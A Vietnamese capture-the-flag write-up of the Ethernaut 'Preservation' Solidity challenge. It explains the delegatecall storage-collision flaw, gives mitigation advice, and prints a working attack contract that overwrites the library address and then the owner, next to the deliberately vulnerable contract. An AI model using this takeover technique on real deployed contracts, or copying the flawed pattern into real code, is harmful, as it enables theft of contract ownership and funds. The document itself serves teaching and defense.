### Kết luận
- Lỗ hổng: Giống ở phần `Delegation` thì `delegatecall` là nguyên nhân chính gây lỗ hổng. Nếu một thư viện độc hại được thay thế vào `timeZone1Library` hoặc `timeZone2Library`, kẻ tấn công có thể thay đổi trạng thái của hợp đồng gốc, bao gồm cả biến owner.
- Cách phòng tránh: Không sử dụng `delegatecall` để gọi thư viện từ địa chỉ lưu trữ bên ngoài, triển khai thư viện dưới dạng immutable hoặc lưu trữ mã thư viện trong hợp đồng chính.
- Thêm một số modifier, require cần thiết.
- VD: (chỉ owner mới được phép thay đổi thư viện)
```solidity
function updateLibrary(address newLibrary) public onlyOwner {
    require(newLibrary != address(0), "Invalid library address");
    timeZone1Library = newLibrary;
}

```

### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IPReservation{
    function setFirstTime(uint256) external;
    function setSecondTime(uint256) external;
}
contract PreservationAttack{
    IPReservation public victim;
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    constructor (address challenge){
        victim = IPReservation(challenge);
    }
     function setTime(uint256 addressAsUint) public {
        owner = address(uint160(addressAsUint));
        // Đặt lại owner bằng địa chỉ chuyển vào

    }
    function attack() external{
        victim.setFirstTime(uint256(uint160(address(this))));
        // Thay đổi địa chỉ timeZone1Library bằng địa chỉ của hợp đồng tấn công


        victim.setFirstTime(uint256(uint160(msg.sender)));
        // Thay đổi owner bằng địa chỉ của kẻ tấn công (msg.sender)
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
